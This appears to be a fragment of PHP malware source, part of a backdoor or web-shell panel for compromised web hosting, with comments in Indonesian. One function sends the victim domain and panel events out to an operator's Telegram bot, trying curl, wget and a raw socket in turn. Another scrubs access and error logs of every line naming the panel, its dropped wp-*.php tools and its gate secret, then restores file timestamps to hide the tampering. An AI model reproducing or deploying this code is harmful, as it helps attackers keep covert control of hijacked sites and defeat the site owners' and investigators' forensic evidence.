}
/* kirim pesan Telegram. Format: [GSFU] <domain> — <event> — <waktu> — <status>.
   Jalur: ext curl -> binary curl/wget via helper exec -> fsockopen ssl://
   manual POST. Return array(ok, detail, raw_respon_singkat). */
function gsp_tg_send($event, $status = 'ok') {
    $c = gsp_tg_load();
    if ($c['TOKEN'] === '' || $c['CHATID'] === '') return array(false, 'Telegram nonaktif (TOKEN/CHATID kosong)', '');
    $text = '[GSFU] ' . gsp_self_host() . ' — ' . $event . ' — ' . date('Y-m-d H:i:s') . ' — ' . $status;
    $url  = 'https://api.telegram.org/bot' . $c['TOKEN'] . '/sendMessage';
    $fields = 'chat_id=' . urlencode($c['CHATID']) . '&text=' . urlencode($text);
    $last = '';
    /* 1. ext curl PHP */
    if (function_exists('curl_init') && function_exists('curl_exec') && !fum_disabled('curl_exec')) {
        $ch = @curl_init($url);
        if ($ch) {
            @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            @curl_setopt($ch, CURLOPT_POST, true);
            @curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 8);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $r = @curl_exec($ch);
            $e = @curl_error($ch);
            @curl_close($ch);
            if (is_string($r) && strpos($r, '"ok":true') !== false) return array(true, 'terkirim via ext-curl', substr($r, 0, 300));
            if (is_string($r) && $r !== '') return array(false, 'API menolak: ' . substr($r, 0, 200), substr($r, 0, 300));
            $last = 'ext-curl gagal' . ($e !== '' ? ': ' . $e : '');
        } else $last = 'ext-curl init gagal';
    } else $last = 'ext-curl tidak ada';
    /* 2. binary curl / wget lewat helper exec existing */
    $rc = fum_run_cmd('curl -m 8 -s -X POST ' . escapeshellarg($url) . ' --data-urlencode ' . escapeshellarg('chat_id=' . $c['CHATID']) . ' --data-urlencode ' . escapeshellarg('text=' . $text));
    if ($rc[0] !== null && trim(strval($rc[0])) !== '') {
        $r = trim(strval($rc[0]));
        if (strpos($r, '"ok":true') !== false) return array(true, 'terkirim via binary curl', substr($r, 0, 300));
        if (strpos($r, '"ok":false') !== false) return array(false, 'API menolak: ' . substr($r, 0, 200), substr($r, 0, 300));
        $last .= '; curl: ' . substr($r, 0, 120);
    }
    $rc = fum_run_cmd('wget -q -T 8 -O- ' . escapeshellarg($url . '?' . $fields));
    if ($rc[0] !== null && trim(strval($rc[0])) !== '') {
        $r = trim(strval($rc[0]));
        if (strpos($r, '"ok":true') !== false) return array(true, 'terkirim via binary wget', substr($r, 0, 300));
        if (strpos($r, '"ok":false') !== false) return array(false, 'API menolak: ' . substr($r, 0, 200), substr($r, 0, 300));
        $last .= '; wget: ' . substr($r, 0, 120);
    }
    /* 3. fsockopen ssl:// manual POST (butuh wrapper openssl) */
    if (function_exists('fsockopen') && !fum_disabled('fsockopen')) {
        $en = 0; $es = '';
        $fp = @fsockopen('ssl://api.telegram.org', 443, $en, $es, 8);
        if ($fp) {
            @stream_set_timeout($fp, 8);
            $req = 'POST /bot' . $c['TOKEN'] . '/sendMessage HTTP/1.0' . "\r\n"
                 . 'Host: api.telegram.org' . "\r\n"
                 . 'Content-Type: application/x-www-form-urlencoded' . "\r\n"
                 . 'Content-Length: ' . strlen($fields) . "\r\n"
                 . 'Connection: close' . "\r\n\r\n" . $fields;
            @fwrite($fp, $req);
            $r = '';
            while (!@feof($fp)) { $chunk = @fread($fp, 8192); if ($chunk === false || $chunk === '') break; $r .= $chunk; if (strlen($r) > 65536) break; }
            @fclose($fp);
            if (strpos($r, '"ok":true') !== false) return array(true, 'terkirim via fsockopen ssl://', substr($r, -300));
            if ($r !== '') return array(false, 'fsockopen: respon tidak ok: ' . substr(trim($r), -200), substr($r, -300));
            $last .= '; fsockopen: respon kosong';
        } else $last .= '; fsockopen ssl:// gagal' . ($es !== '' ? ': ' . $es : '');
    } else $last .= '; fsockopen tidak ada';
    return array(false, 'outbound HTTPS tidak tersedia di hosting ini (' . $last . ')', '');
}

/* ---------- LOG CLEANER ---------- */
/* target: ~/logs/*, ~/access-logs/*, ~/access_log, error_log di dir panel
   & webroot (dedup) */
function gsp_logclean_targets() {
    $h = gsp_home();
    $files = array();
    foreach (array($h . '/logs/*', $h . '/access-logs/*') as $g) {
        $gs = @glob($g);
        if (is_array($gs)) foreach ($gs as $f) if (@is_file($f)) $files[] = $f;
    }
    $doc = (isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT'] !== '') ? strval($_SERVER['DOCUMENT_ROOT']) : dirname(strval(__FILE__));
    foreach (array($h . '/access_log', dirname(strval(__FILE__)) . '/error_log', $doc . '/error_log') as $f) {
        if (@is_file($f)) $files[] = $f;
    }
    return array_values(array_unique($files));
}
/* hapus baris berpola (nama file panel, nama drop tools, path panel) dari
   log; hanya file writable; >20MB di-skip + dicatat; mtime log DIKEMBALIKAN
   ke semula (gsp_rc_write_stealth); file tanpa baris cocok TIDAK ditulis
   ulang. Return baris log hasil (berapa baris dihapus per file). */
function gsp_logclean_run() {
    $log = array();
    $pats = array(basename(strval(__FILE__)), dirname(strval(__FILE__)));
    /* v65.9: pola nama file drop tools AKTUAL (nama wp-*.php hasil drop)
       dari state .gsfu_tools.dat + manifest dtools; gate secret ikut
       dibersihkan dari URL log */
    if (function_exists('gsfu_tools_load')) {
        $gst = gsfu_tools_load();
        foreach (array('upload.php', 'rusak_toggle.php') as $lbl) {
            if (isset($gst[$lbl]) && is_string($gst[$lbl]) && $gst[$lbl] !== '') { $pats[] = basename($gst[$lbl]); $pats[] = $gst[$lbl]; }
        }
        if (isset($gst['_gate']) && is_array($gst['_gate']) && isset($gst['_gate']['secret']) && strlen(strval($gst['_gate']['secret'])) >= 4)
            $pats[] = strval($gst['_gate']['secret']);
    }
    if (function_exists('gsp_imm_load')) {
        $lcm = gsp_imm_load();
        if (is_array($lcm) && isset($lcm['dtools']) && is_array($lcm['dtools'])) {
            foreach ($lcm['dtools'] as $dte) {
                if (isset($dte['path']) && is_string($dte['path']) && $dte['path'] !== '') { $pats[] = basename($dte['path']); $pats[] = $dte['path']; }
            }
        }
    }
    $pats = array_values(array_unique($pats));
    $files = gsp_logclean_targets();
    if (!count($files)) { $log[] = '[i] log: tidak ada file target (~/logs, ~/access-logs, ~/access_log, error_log)'; return $log; }
    $tot = 0;
    foreach ($files as $f) {
        if (!@is_writable($f)) { $log[] = '[!] log skip (tidak writable): ' . $f; continue; }
        $sz = @filesize($f);
        if ($sz === false) continue;
        if ($sz > 20971520) { $log[] = '[!] log skip (>20MB, ' . round($sz / 1048576, 1) . 'MB): ' . $f; continue; }
        $c = @file_get_contents($f);
        if (!is_string($c) || $c === '') continue;
        $keep = array();
        $rm = 0;
        foreach (preg_split('/\n/', $c) as $ln) {
            $hit = false;
            foreach ($pats as $p) { if ($p !== '' && strpos($ln, $p) !== false) { $hit = true; break; } }
            if ($hit) $rm++; else $keep[] = $ln;
        }
        if ($rm === 0) continue; // aman: tanpa baris cocok, file tidak ditulis ulang
        if (gsp_rc_write_stealth($f, implode("\n", $keep)) !== false) { $log[] = '[+] log ' . $f . ': ' . $rm . ' baris dihapus (mtime dijaga)'; $tot += $rm; }
        else $log[] = '[x] log gagal menulis: ' . $f;
    }
    $log[] = '[OK] LOG CLEANER selesai — total ' . $tot . ' baris dihapus dari ' . count($files) . ' file terpantau';
    return $log;
}

